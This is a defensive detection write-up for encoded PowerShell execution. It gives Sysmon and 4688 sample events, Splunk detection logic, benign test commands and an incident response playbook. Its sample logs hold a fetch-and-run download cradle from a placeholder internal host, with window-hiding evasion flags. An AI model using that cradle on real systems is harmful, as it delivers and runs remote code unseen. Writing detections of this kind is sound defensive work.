# Encoded PowerShell Execution

---

## Detection Name

**Name:** `Encoded PowerShell Execution`
**File:** [`enc_powershell_execution.md`](./enc_powershell_execution.md)

---

## Purpose

Detect the execution of PowerShell with a Base64-encoded command payload passed via the `-EncodedCommand`, `-enc`, or `-e` flags. Threat actors routinely use command encoding to obfuscate malicious payloads — including download cradles, reverse shells, and post-exploitation modules — from casual inspection and signature-based detection.

**What this detects:**
Any invocation of `powershell.exe` (or `pwsh.exe`) where the command line contains an encoding flag followed by a Base64 string. The detection fires regardless of parent process, user context, or working directory, then suppresses known-good patterns via allowlist.

**Blind spots / assumptions:**

- Detection relies on command-line logging being enabled. On Windows, this requires either **Sysmon Event ID 1** or **Security Event ID 4688** with `Process Command Line` auditing enabled via Group Policy (`Computer Configuration > Administrative Templates > System > Audit Process Creation`).
- Encoded strings that are split across multiple lines or concatenated at runtime will not be caught by this rule.
- This rule detects the *invocation pattern*, not the decoded content. A secondary enrichment step (decoder) is required to analyze payload intent.
- PowerShell Constrained Language Mode and AMSI can be bypassed by adversaries targeting older CLR versions; encoding may persist in those environments without generating script block logs.
- Will not fire on unmanaged PowerShell injection (see: `Unusual_PowerShell_Host_Process` detection) where the PowerShell DLL is loaded into a non-standard process — the command line is never recorded in that scenario.
- Does not cover `pwsh.exe` (PowerShell 7) unless log sources are extended to include it.

---

## Attack Mapping

| Field | Value |
|-------|-------|
| **Tactic** | Execution |
| **Technique** | [`T1059.001 — Command and Scripting Interpreter: PowerShell`](https://attack.mitre.org/techniques/T1059/001/) |
| **Sub-technique** | T1059.001 |
| **Related Techniques** | [`T1027 — Obfuscated Files or Information`](https://attack.mitre.org/techniques/T1027/) |

---

## Alerting and Detection Approach

The strategy functions as follows:

- Monitor process creation events via Sysmon (Event ID 1) or Windows Security Auditing (Event ID 4688) on all Windows endpoints.
- Match any command line containing `powershell.exe` or `pwsh.exe` paired with an encoding flag (`-enc`, `-e`, `-encodedcommand`) followed by a Base64 string of at least 20 characters.
- Suppress known-good patterns (e.g., documented SCCM task sequences, Azure AD Connect, approved admin tooling) via an allowlist tied to `ParentImage` path and signing certificate.
- Alert on all remaining matches with enriched context: decoded payload preview, parent process chain, user account type, and host criticality.

**Data Source(s):**
- Sysmon Event ID 1 (Process Create) — primary
- Windows Security Event ID 4688 (Process Create with command line) — secondary
- EDR process telemetry (CrowdStrike Falcon, Microsoft Defender for Endpoint) — supplementary

**Platform(s) / Tool(s):**
- Windows 10 / Windows 11 / Windows Server 2016+
- Splunk (SIEM query below)
- Sysmon v14+ (schema version 4.70+)
- CrowdStrike Falcon (supplementary enrichment)

**Key Log Fields / Indicators:**

| Field | Expected Value |
|-------|----------------|
| `EventID` | `1` (Sysmon) or `4688` (Security) |
| `Image` | `*\powershell.exe` or `*\pwsh.exe` |
| `CommandLine` | Contains `-enc`, `-e `, or `-encodedcommand` flag |
| `CommandLine` | Followed by `[A-Za-z0-9+/=]{20,}` (Base64 blob) |
| `ParentImage` | Suspicious parents: `cmd.exe`, `wscript.exe`, `mshta.exe`, `excel.exe`, `winword.exe`, `explorer.exe` |
| `IntegrityLevel` | `High` or `System` — elevates priority |
| `User` | Non-service account in sensitive OU — elevates priority |

**Representative True Positive — Sysmon Event ID 1:**

```
EventID:            1
RuleName:           technique_id=T1059.001,technique_name=PowerShell
UtcTime:            2026-03-15 14:22:31.847
ProcessGuid:        {a23eae89-4b2f-67d8-0000-0010b3c51c00}
ProcessId:          4872
Image:              C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion:        10.0.19041.3636
Description:        Windows PowerShell
Product:            Microsoft® Windows® Operating System
Company:            Microsoft Corporation
OriginalFileName:   PowerShell.EXE
CommandLine:        powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAA6ADgAMAA4ADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==
CurrentDirectory:   C:\Users\jsmith\AppData\Local\Temp\
User:               CORP\jsmith
LogonGuid:          {a23eae89-4b2c-67d8-0000-002087541200}
LogonId:            0x1254870
TerminalSessionId:  1
IntegrityLevel:     High
Hashes:             MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1848474F56,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744
ParentProcessGuid:  {a23eae89-4b1a-67d8-0000-0010f0a21c00}
ParentProcessId:    3124
ParentImage:        C:\Windows\System32\cmd.exe
ParentCommandLine:  "C:\Windows\System32\cmd.exe" /c powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA...
ParentUser:         CORP\jsmith
```

> **Decoded payload** (UTF-16LE Base64 → plaintext):
> ```
> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload.ps1')
> ```
> This is a classic download cradle — fetches and executes a remote script in memory without writing to disk.

**Representative True Positive — Windows Security Event ID 4688:**

```
EventID:            4688
TimeCreated:        2026-03-15T14:22:31.847Z
SubjectUserSid:     S-1-5-21-3623811015-3361044348-30300820-1013
SubjectUserName:    jsmith
SubjectDomainName:  CORP
SubjectLogonId:     0x1254870
NewProcessId:       0x1308
NewProcessName:     C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TokenElevationType: TokenElevationTypeFull (3)
ProcessId:          0xC34
CommandLine:        powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAA6ADgAMAA4ADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==
ParentProcessName:  C:\Windows\System32\cmd.exe
```

**Detection Logic — Splunk (SPL):**

```spl
index=wineventlog (source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1)
  OR (source="WinEventLog:Security" EventID=4688)
| where match(lower(CommandLine), "powershell(\.exe)?\s.{0,100}-(e\s|enc\s|encodedcommand\s)\s*[A-Za-z0-9+/=]{20,}")
| eval decoded_flag=if(match(CommandLine,"(?i)-encodedcommand"),"EncodedCommand",
                   if(match(CommandLine,"(?i)\-enc\b"),"enc",
                   if(match(CommandLine,"(?i)\s\-e\s"),"e","unknown")))
| eval parent_risk=case(
    match(lower(ParentImage),"(mshta|wscript|cscript|excel|winword|powerpnt|outlook|acrord32)"),"HIGH",
    match(lower(ParentImage),"(cmd|explorer)"),"MEDIUM",
    true(),"LOW")
| eval integrity_risk=if(IntegrityLevel="High" OR IntegrityLevel="System","ELEVATED","STANDARD")
| table _time, host, User, CommandLine, ParentImage, ProcessId, ParentProcessId, decoded_flag, parent_risk, integrity_risk, IntegrityLevel
| sort -_time
```

**Enrichment Steps:**

1. Decode the Base64 payload: extract the Base64 string from `CommandLine`, decode from UTF-16LE, and include the plaintext in the alert.
2. Enrich `User` against AD — flag if the account is a service account, privileged account, or in a sensitive OU.
3. Enrich `host` against asset inventory — flag if the host is a server, DC, or high-value workstation.
4. Pull subsequent process creation events (child processes of PID `4872` in the example) within a 5-minute window.
5. Pull network connection events (Sysmon Event ID 3) for the same PID and timeframe.

---

## Threat Object Context

**What is the threat object?**
The `-EncodedCommand` flag (and its aliases `-enc` and `-e`) is a native PowerShell parameter that accepts a Base64-encoded, UTF-16LE command string as input. It is built into every version of PowerShell and requires no additional tooling to abuse.

**How does the attack work?**

1. The adversary crafts a malicious PowerShell command — commonly a download cradle, reverse shell, or in-memory loader (e.g., `IEX`, `Invoke-Expression`, `[System.Reflection.Assembly]::Load`).
2. The command is Base64-encoded in UTF-16LE format (PowerShell's native string encoding), producing a string with no readable keywords.
3. The adversary delivers the encoded invocation via a dropper: a phishing macro, a weaponized LNK file, a scheduled task, or a parent process like `cmd.exe`, `mshta.exe`, or `wscript.exe`.
4. PowerShell decodes and executes the payload entirely in memory, often avoiding disk writes and bypassing file-based AV signatures.
5. Common companion flags amplify evasion:
   - `-NoProfile` / `-NoP` — skips profile scripts that might log or block execution
   - `-NonInteractive` / `-NonI` — suppresses user prompts
   - `-WindowStyle Hidden` / `-W Hidden` — hides the console window from the user
   - `-ExecutionPolicy Bypass` / `-Exec Bypass` — bypasses execution policy restrictions

**Why is this a threat?**
Encoding is one of the most elementary and effective obfuscation techniques available to an adversary. It defeats string-matching signatures, hides C2 addresses and payload logic from casual log review, and is natively supported by the OS. It is heavily used across the threat landscape — from commodity malware (Emotet, QakBot) to nation-state tooling — and is a core technique in frameworks like Cobalt Strike, Metasploit, and PowerShell Empire.

**Investigation tips / pivot points:**

- **Decode the payload immediately.** Extract the Base64 blob from the command line and decode: `[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<blob>'))`. Look for `IEX`, `DownloadString`, `DownloadData`, `WebClient`, `Reflection.Assembly`, `socket`, or IP/domain literals.
- **Trace the parent process chain.** A parent of `winword.exe`, `mshta.exe`, or `wscript.exe` is a strong indicator of a phishing-delivered stage-one payload.
- **Look for Sysmon Event ID 3** (Network Connect) from the same PID — a connection to a non-corporate external IP immediately after execution strongly suggests a download cradle or C2 beacon.
- **Check Sysmon Event ID 7** (Image Load) for the same PID — loading of known offensive .NET assemblies (e.g., `System.Management.Automation.dll` from an unusual path) is a secondary indicator.
- **Review PowerShell Script Block Logs** (Event ID 4104, channel `Microsoft-Windows-PowerShell/Operational`) — if script block logging is enabled, the decoded payload will be logged here even when `-EncodedCommand` is used.
- **Check for persistence** — after encoded execution, adversaries commonly establish persistence via `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, scheduled tasks, or WMI subscriptions. Review registry and task creation events in the same timeframe.
- **Pivot on the user account** — if the user is not a sysadmin and does not regularly run PowerShell, the activity is highly anomalous. Pull the user's 30-day PowerShell execution baseline.

---

## Assumptions and Known False Positives

**Known false positive scenarios:**

| Scenario | Defining Characteristics | Mitigation |
|----------|--------------------------|------------|
| Microsoft SCCM / ConfigMgr task sequences | `ParentImage` is `ccmexec.exe` or `smstsge.exe`; `User` is `NT AUTHORITY\SYSTEM`; command line matches known deployment GUID | Allowlist by parent process path and signing certificate |
| Azure AD Connect / AAD Sync | `ParentImage` is `AzureADConnect.exe` or `miiserver.exe`; consistent schedule; `User` is the AAD sync service account | Allowlist by service account UPN and parent image path |
| Legitimate admin tooling (e.g., PSAppDeployToolkit) | Consistent `ParentImage`, signed binary, reproducible schedule, known IT asset | Allowlist by `ParentImage` hash and `User` (helpdesk/admin OU) |
| Security tooling / EDR self-tests | `User` is the EDR service account; parent is the EDR agent process | Allowlist by `ParentImage` path of known EDR binary |
| Some JetBrains / VS build integrations | Spawned during build pipeline; `User` is build agent service account | Allowlist by build agent hostname pattern and service account |

**False positive minimization strategies:**
- [x] Narrow scope by requiring encoding flag to be paired with at least one additional evasion flag (`-NoP`, `-NonI`, `-W Hidden`, `-Exec Bypass`)
- [x] Exclude known-good parent processes by exact image path and valid digital signature
- [x] Backend suppression: allowlist service accounts in the `SVC_*` OU that have documented use of encoded commands
- [ ] Enrichment gate: only alert when decoded payload contains high-risk keywords (`IEX`, `DownloadString`, `socket`, `Reflection.Assembly`)

---

## Testing & Validation

**Prerequisites:**
- A Windows 10/11 test VM with Sysmon installed and configured with a ruleset that captures Event ID 1 (process create with full command line).
- Log forwarding to your SIEM is active and Event ID 1 records are searchable.
- PowerShell command-line auditing enabled via Group Policy (if also testing Event ID 4688).

**Steps:**

1. Open a standard (non-elevated) PowerShell or `cmd.exe` session on the test host.
2. Run the following to encode a benign test command and execute it:
```powershell
$testCmd  = 'Write-Host "FADE-TEST: Encoded PowerShell Execution fired successfully" -ForegroundColor Green'
$encoded  = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($testCmd))
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand $encoded
```
3. Within 60 seconds, search your SIEM for the process create event.
4. Confirm the alert fires, the `CommandLine` field contains the `-EncodedCommand` flag and Base64 blob, and the decoded output matches the test string.
5. Optionally, run from `cmd.exe` as the parent to simulate a more realistic delivery chain:
```bat
cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Enc JABjAG0AZAAgAD0AIAAnAEYAQQBEAEUALQBUAEUAUwBUACcACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAJABjAG0AZAA=
```

**Expected result:**
A Sysmon Event ID 1 (or Security Event 4688) is generated with:
- `Image` ending in `\powershell.exe`
- `CommandLine` matching the `-Enc` pattern
- `ParentImage` of `cmd.exe` (step 5) or `powershell.exe` (step 2)
- Alert fires in SIEM within the pipeline's expected latency window

**Atomic Red Team test:**

```powershell
# T1059.001 - PowerShell Encoded Command
Invoke-AtomicTest T1059.001 -TestNumbers 8
```

> Atomic Red Team Test #8 for T1059.001 executes a benign Base64-encoded command via `-EncodedCommand` and is a direct match for this detection. See: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md

---

## Severity

**Default Severity: Medium**

| Level | Description |
|-------|-------------|
| Informational | Context only; no immediate action required |
| Low | Suspicious but unlikely to indicate active compromise |
| **Medium** | **Default — warrants investigation** |
| High | Strong indicator of compromise; escalate promptly |
| Critical | Confirmed or near-certain active threat; immediate response required |

**Assigned Severity:** `High`

**Rationale:**
While legitimate software occasionally uses `-EncodedCommand`, the combination of encoding flags with additional evasion parameters (`-NoProfile`, `-WindowStyle Hidden`, `-ExecutionPolicy Bypass`) has very low benign prevalence in most enterprise environments. After allowlisting known-good patterns, remaining alerts have a high true-positive rate and frequently represent the execution phase of a multi-stage intrusion. Severity is set to **High** to ensure timely analyst response.

Downgrade to **Medium** if the environment has high volumes of legitimate encoded PowerShell that cannot be fully suppressed.

---

## Detection Response

> Incident Response playbook for `Encoded PowerShell Execution`

### Initial Triage

1. Retrieve the full command line from the alert and decode the Base64 payload:
   ```powershell
   [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<paste_blob_here>'))
   ```
2. Determine if the decoded payload contains high-risk indicators: `IEX`, `DownloadString`, `DownloadData`, `WebClient`, `socket`, IP literals, domain literals, or reflection-based loading.
3. Check whether the affected host and user are in scope for a known change, deployment, or pen-test activity. Cross-reference with the change management system and any active red-team engagements before escalating.
4. Review the parent process chain — document every ancestor from `powershell.exe` back to the session root.

### Key Data Points to Collect

- Full `CommandLine` value and decoded payload plaintext
- `ProcessGuid`, `ProcessId`, `ParentProcessGuid`, `ParentProcessId`
- `User` UPN, AD OU, group memberships, recent logon history
- Host name, IP address, OS version, asset criticality tier
- All Sysmon Event ID 3 (Network Connect) records for the PID within ±10 minutes
- All Sysmon Event ID 11 (File Create) records for the same PID and `User` within ±10 minutes
- PowerShell Script Block Logs (Event ID 4104) for the session — pull the full `ScriptBlockText` fields
- Any scheduled task creation (Event ID 4698) or registry run key modifications (Sysmon Event ID 13) within ±30 minutes and the same `User`

### Escalation Criteria

Escalate to **Critical** if any of the following are observed:

- Decoded payload contains a live C2 address, reverse shell, or download of a secondary payload
- Network connections are established to an external IP immediately after execution
- The affected host is a domain controller, file server, or other Tier-0 / Tier-1 asset
- Lateral movement indicators (remote WMI, PsExec, WinRM) are observed from the host within 30 minutes
- Multiple hosts show the same encoded command, indicating automated/worm-like spread

### Containment & Remediation

1. **Isolate** the affected host from the network via EDR (CrowdStrike: `contain host`) or VLAN quarantine. Do not power off — preserve volatile memory for forensics.
2. **Disable** the affected user account in Active Directory pending investigation. Reset credentials if compromise is confirmed.
3. **Kill** the suspicious PowerShell process and any child processes if still running.
4. **Collect** a memory image and disk triage package (via EDR or IR tooling) before any remediation steps that could destroy artifacts.
5. **Search** for persistence mechanisms established during the execution window: scheduled tasks, registry run keys, WMI subscriptions, new local accounts, and startup folder entries.
6. **Scan** for lateral movement — review authentication logs (Event ID 4624, 4648) from the compromised host for connections to other internal systems.
7. **Rebuild** the host from a known-good image if malicious code execution is confirmed. Do not attempt to clean in place.

### Communication Requirements

- Open an incident ticket immediately if decoded payload is confirmed malicious.
- Notify the SOC lead within 15 minutes of escalation to Critical.
- If the affected host is a Tier-0/Tier-1 asset, page the IR team on-call directly.
- Preserve all evidence (raw logs, memory image, disk triage) and chain of custody documentation before remediation.

---

## References

| Title | URL |
|-------|-----|
| MITRE ATT&CK: T1059.001 — PowerShell | https://attack.mitre.org/techniques/T1059/001/ |
| MITRE ATT&CK: T1027 — Obfuscated Files or Information | https://attack.mitre.org/techniques/T1027/ |
| Palantir ADS Framework | https://github.com/palantir/alerting-detection-strategy-framework |
| Atomic Red Team — T1059.001 | https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md |
| Detecting Obfuscated PowerShell — FireEye | https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html |
| PowerShell ♥ the Blue Team — Microsoft | https://devblogs.microsoft.com/powershell/powershell-the-blue-team/ |
| Sysmon Configuration — SwiftOnSecurity | https://github.com/SwiftOnSecurity/sysmon-config |
| NSA/CISA PowerShell Security Guide | https://media.defense.gov/2022/Jun/22/2003021689/-1/-1/1/CSI_KEEPING_POWERSHELL_SECURITY_MEASURES_TO_USE_AND_EMBRACE_20220622.PDF |

---

*FADE — Framework for Alert & Detection Engineering*
